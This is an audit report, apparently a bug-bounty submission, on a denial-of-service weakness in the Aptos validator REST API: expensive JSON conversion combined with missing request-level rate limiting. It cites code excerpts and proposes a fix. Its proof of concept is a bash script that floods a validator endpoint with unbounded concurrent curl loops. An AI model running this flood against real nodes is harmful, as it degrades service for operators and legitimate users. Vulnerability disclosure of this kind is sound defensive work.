# Audit Report

## Title
AcceptType Manipulation Causing API Performance Degradation on Validator Nodes

## Summary
Validator nodes expose public REST APIs by default with both JSON and BCS output formats enabled. An attacker can force expensive JSON conversion on high-frequency queries by manipulating the Accept header, causing API performance degradation without affecting consensus operations.

## Finding Description

The Aptos REST API supports two output formats controlled by the `AcceptType` enum: JSON (human-readable) and BCS (efficient binary). [1](#0-0) 

When no Accept header is provided, the API defaults to JSON format. [2](#0-1) 

Validator nodes expose this API publicly by default on all network interfaces. [3](#0-2) 

The JSON conversion path is significantly more expensive than BCS:

**For JSON output**, the API must:
1. Create state views and converters
2. Fetch auxiliary transaction data from the database
3. Deserialize BCS-encoded data
4. Use `AptosValueAnnotator` to annotate Move values with type information
5. Convert annotated values to JSON format [4](#0-3) [5](#0-4) 

**For BCS output**, the API simply returns raw bytes from storage. [6](#0-5) 

The conversion process involves expensive operations including database queries, BCS deserialization, type layout fetching, and value annotation. [7](#0-6) 

**Critical Finding: No Request-Level Rate Limiting**

Despite documentation claiming "100 requests per minute" rate limiting, [8](#0-7)  the API runtime implements NO request-level rate limiting middleware. The middleware chain only includes PostSizeLimit, Compression, and CatchPanic. [9](#0-8) 

HAProxy provides only connection-level limiting (`maxconnrate 300`), not request-level limiting. [10](#0-9)  HTTP Keep-Alive allows multiple requests per connection, bypassing this protection.

## Impact Explanation

This issue qualifies as **Medium severity** under the Aptos bug bounty program criteria, as it causes API service degradation but does not directly impact consensus operations.

**Why not Higher Severity:**
- The API runs on a separate runtime and port (8080) from consensus (6180)
- Worker pool limits provide natural backpressure (default 2Ã— CPU cores) [11](#0-10) 
- Does not violate consensus safety, deterministic execution, or state consistency invariants
- Does not cause funds loss or state corruption

**Actual Impact:**
- API worker threads saturated with expensive JSON conversions
- Increased response times for legitimate API users
- Potential monitoring/health check failures if they rely on API endpoints
- Resource exhaustion (CPU/memory) in API service

## Likelihood Explanation

**High Likelihood** - This attack is trivial to execute:
1. No authentication required for public API endpoints
2. Attacker simply sends HTTP requests with `Accept: application/json` header (or omits header to use default)
3. Can target high-volume endpoints like `/transactions?limit=100`
4. HTTP Keep-Alive allows sustained attack with few connections
5. Default validator configuration is vulnerable

## Recommendation

Implement proper request-level rate limiting in the API middleware:

```rust
// In api/src/runtime.rs, add rate limiting middleware
use tower_governor::{GovernorLayer, governor::GovernorConfigBuilder};

// In attach_poem_to_runtime, before building routes:
let governor_conf = Box::new(
    GovernorConfigBuilder::default()
        .per_second(100)  // Match documented rate
        .burst_size(10)
        .finish()
        .unwrap(),
);

let route = Route::new()
    // ... existing routes ...
    .with(GovernorLayer { config: governor_conf })  // Add rate limiting
    .with_if(config.api.compression_enabled, Compression::new())
    // ... rest of middleware chain ...
```

**Additional Mitigations:**
1. Add configuration to disable JSON output on validator nodes: `api.json_output_enabled: false`
2. Document that validators should use BCS-only mode for production
3. Implement per-IP request tracking and limiting
4. Add metrics to monitor JSON vs BCS usage patterns

## Proof of Concept

```bash
#!/bin/bash
# PoC: Saturate validator API with expensive JSON conversions

VALIDATOR_API="http://validator-node:8080/v1"

# Function to send JSON request
attack_json() {
    while true; do
        curl -H "Accept: application/json" \
             "$VALIDATOR_API/transactions?limit=100" \
             >/dev/null 2>&1 &
    done
}

# Launch 50 concurrent attack processes
# Each maintains HTTP Keep-Alive connections
# Bypasses HAProxy's maxconnrate via connection reuse
for i in {1..50}; do
    attack_json &
done

echo "Attack launched. Monitor API response times and worker saturation."

# Expected result: 
# - API response times increase significantly
# - Worker threads at 100% utilization
# - Legitimate requests delayed or timeout
# - Meanwhile: curl with "Accept: application/x-bcs" remains fast
```

**Notes**
- This vulnerability exists due to the mismatch between documented rate limiting (100 req/min) and actual implementation (no request-level limits)
- The performance difference between JSON and BCS conversion is substantial, making this an effective DoS vector
- Validators using default configurations are vulnerable
- The attack requires no special privileges or insider access

### Citations

**File:** api/src/accept_type.rs (L11-16)
```rust
pub enum AcceptType {
    /// Convert and resolve types to JSON
    Json,
    /// Take types with as little conversion as possible from the database
    Bcs,
}
```

**File:** api/src/accept_type.rs (L39-40)
```rust
    // Default to returning content as JSON.
    Ok(AcceptType::Json)
```

**File:** terraform/helm/aptos-node/files/configs/validator-base.yaml (L40-42)
```yaml
api:
  enabled: true
  address: "0.0.0.0:8080"
```

**File:** api/src/transactions.rs (L872-890)
```rust
        match accept_type {
            AcceptType::Json => {
                let timestamp = self
                    .context
                    .get_block_timestamp(&latest_ledger_info, start_version)?;
                BasicResponse::try_from_json((
                    self.context.render_transactions_sequential(
                        &latest_ledger_info,
                        data,
                        timestamp,
                    )?,
                    &latest_ledger_info,
                    BasicResponseStatus::Ok,
                ))
            },
            AcceptType::Bcs => {
                BasicResponse::try_from_bcs((data, &latest_ledger_info, BasicResponseStatus::Ok))
            },
        }
```

**File:** api/src/context.rs (L737-768)
```rust
    pub fn render_transactions_sequential<E: InternalError>(
        &self,
        ledger_info: &LedgerInfo,
        data: Vec<TransactionOnChainData>,
        mut timestamp: u64,
    ) -> Result<Vec<aptos_api_types::Transaction>, E> {
        if data.is_empty() {
            return Ok(vec![]);
        }

        let state_view = self.latest_state_view_poem(ledger_info)?;
        let converter = state_view.as_converter(self.db.clone(), self.indexer_reader.clone());
        let txns: Vec<aptos_api_types::Transaction> = data
            .into_iter()
            .map(|t| {
                // Update the timestamp if the next block occurs
                if let Some(txn) = t.transaction.try_as_block_metadata_ext() {
                    timestamp = txn.timestamp_usecs();
                } else if let Some(txn) = t.transaction.try_as_block_metadata() {
                    timestamp = txn.timestamp_usecs();
                }
                let txn = converter.try_into_onchain_transaction(timestamp, t)?;
                Ok(txn)
            })
            .collect::<Result<_, anyhow::Error>>()
            .context("Failed to convert transaction data from storage")
            .map_err(|err| {
                E::internal_with_code(err, AptosErrorCode::InternalError, ledger_info)
            })?;

        Ok(txns)
    }
```

**File:** api/types/src/convert.rs (L173-242)
```rust
    pub fn try_into_onchain_transaction(
        &self,
        timestamp: u64,
        data: TransactionOnChainData,
    ) -> Result<Transaction> {
        use aptos_types::transaction::Transaction::{
            BlockEpilogue, BlockMetadata, BlockMetadataExt, GenesisTransaction, StateCheckpoint,
            UserTransaction,
        };
        let aux_data = self
            .db
            .get_transaction_auxiliary_data_by_version(data.version)?;
        let info = self.into_transaction_info(
            data.version,
            &data.info,
            data.accumulator_root_hash,
            data.changes,
            aux_data,
        );
        let events = self.try_into_events(&data.events)?;
        Ok(match data.transaction {
            UserTransaction(txn) => {
                let payload = self.try_into_transaction_payload(txn.payload().clone())?;
                (&txn, info, payload, events, timestamp).into()
            },
            GenesisTransaction(write_set) => {
                let payload = self.try_into_write_set_payload(write_set)?;
                (info, payload, events).into()
            },
            BlockMetadata(txn) => Transaction::BlockMetadataTransaction(
                BlockMetadataTransaction::from_internal(txn, info, events),
            ),
            BlockMetadataExt(txn) => Transaction::BlockMetadataTransaction(
                BlockMetadataTransaction::from_internal_ext(txn, info, events),
            ),
            StateCheckpoint(_) => {
                Transaction::StateCheckpointTransaction(StateCheckpointTransaction {
                    info,
                    timestamp: timestamp.into(),
                })
            },
            BlockEpilogue(block_epilogue_payload) => {
                let block_end_info = block_epilogue_payload
                    .try_as_block_end_info()
                    .unwrap()
                    .clone();
                let block_end_info = match block_end_info {
                    BlockEndInfo::V0 {
                        block_gas_limit_reached,
                        block_output_limit_reached,
                        block_effective_block_gas_units,
                        block_approx_output_size,
                    } => Some(crate::transaction::BlockEndInfo {
                        block_gas_limit_reached,
                        block_output_limit_reached,
                        block_effective_block_gas_units,
                        block_approx_output_size,
                    }),
                };
                Transaction::BlockEpilogueTransaction(BlockEpilogueTransaction {
                    info,
                    timestamp: timestamp.into(),
                    block_end_info,
                })
            },
            aptos_types::transaction::Transaction::ValidatorTransaction(txn) => {
                Transaction::ValidatorTransaction((txn, info, events, timestamp).into())
            },
        })
    }
```

**File:** api/doc/README.md (L27-27)
```markdown
- Rate limiting: 100 requests per minute by default
```

**File:** api/src/runtime.rs (L253-259)
```rust
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
```

**File:** api/src/runtime.rs (L289-296)
```rust
/// Returns the maximum number of runtime workers to be given to the
/// API runtime. Defaults to 2 * number of CPU cores if not specified
/// via the given config.
fn get_max_runtime_workers(api_config: &ApiConfig) -> usize {
    api_config
        .max_runtime_workers
        .unwrap_or_else(|| num_cpus::get() * api_config.runtime_worker_multiplier)
}
```

**File:** docker/compose/aptos-node/haproxy.cfg (L8-12)
```text
    # Limit the maximum number of connections to 500 (this is ~5x the validator set size)
    maxconn 500

    # Limit the maximum number of connections per second to 300 (this is ~3x the validator set size)
    maxconnrate 300
```
